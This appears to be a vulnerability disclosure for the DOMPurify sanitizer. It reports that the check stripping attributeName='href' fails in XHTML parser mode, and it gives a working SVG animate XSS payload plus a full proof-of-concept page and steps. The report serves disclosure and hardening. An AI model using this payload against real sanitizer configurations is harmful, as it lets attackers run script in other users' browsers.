### Summary

DOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `"attributename"` never matches and the guard does nothing.

An app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName="href" values="x;javascript:alert(1)">`. Clicking the parent link then runs the script.

This needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.

### Details

In `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):

```js
const lcName = transformCaseFunc(name);
...
if (lcName === "attributename" && stringMatch(value, "href")) {
  _removeAttribute(name, currentNode, attr);
  continue;
}
```

`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.

People using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.

The value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill="freeze"`, the last entry ends up as the effective href of the parent `<a>`.

In text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.

This is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.

### Proof of concept

Tested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.

Config:

```js
const cfg = {
  PARSER_MEDIA_TYPE: 'application/xhtml+xml',
  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],
  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],
};
```

`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.

Input:

```html
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"><a id="q"><animate attributeName="href" values="x;javascript:alert(1)" dur="0.01s" fill="freeze"/><text x="10" y="40" font-size="30">click</text></a></svg>
```

Steps:

1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.

```html
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>poc</title>
<script src="purify.js"></script></head><body><div id="sink"></div>
<script>//<![CDATA[
const cfg = {
  PARSER_MEDIA_TYPE: 'application/xhtml+xml',
  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],
  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],
};
const dirty = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"><a id="q"><animate attributeName="href" values="x;javascript:alert(1)" dur="0.01s" fill="freeze"/><text x="10" y="40" font-size="30">click</text></a></svg>';
const clean = DOMPurify.sanitize(dirty, cfg);
console.log(clean);
document.getElementById('sink').innerHTML = clean;
//]]></script></body></html>
```

2. The logged output still contains `attributeName="href"` and `values="x;javascript:alert(1)"`.
3. `document.getElementById('q').href.animVal` returns `"javascript:alert(1)"`.
4. Click "click" and `alert(1)` runs.

As a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `""`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.

An automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.

